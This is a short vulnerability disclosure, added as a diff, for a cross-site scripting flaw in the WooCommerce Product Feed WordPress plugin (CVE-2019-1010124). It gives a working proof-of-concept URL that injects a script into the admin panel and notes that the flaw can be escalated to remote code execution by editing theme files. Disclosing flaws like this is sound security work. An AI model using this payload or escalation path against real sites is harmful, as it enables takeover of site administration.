@@ -1,0 +1,17 @@
+# Exploit Title: WordPress Plugin WooCommerce Product Feed <= 2.2.18 - Cross-Site Scripting
+# Date: 30 August 2019
+# Exploit Author: Damian Ebelties (https://zerodays.lol/)
+# Vendor Homepage: https://wordpress.org/plugins/webappick-product-feed-for-woocommerce/
+# Version: <= 2.2.18
+# Tested on: Ubuntu 18.04.1
+# CVE: CVE-2019-1010124
+
+The WordPress plugin 'WooCommerce Product Feed' does not correctly sanitize user-input,
+which leads to Cross-Site Scripting in the Admin Panel.
+
+Since it is WordPress, it's fairly easy to get RCE with this XSS, by editing the theme
+files via (for example) XHR requests with included Javascript.
+
+Proof-of-Concept:
+
+    https://domain.tld/wp-admin/admin.php?page=woo_feed_manage_feed&link=%3E%3Cscript%3Ealert`zerodays.lol`;%3C/script%3E
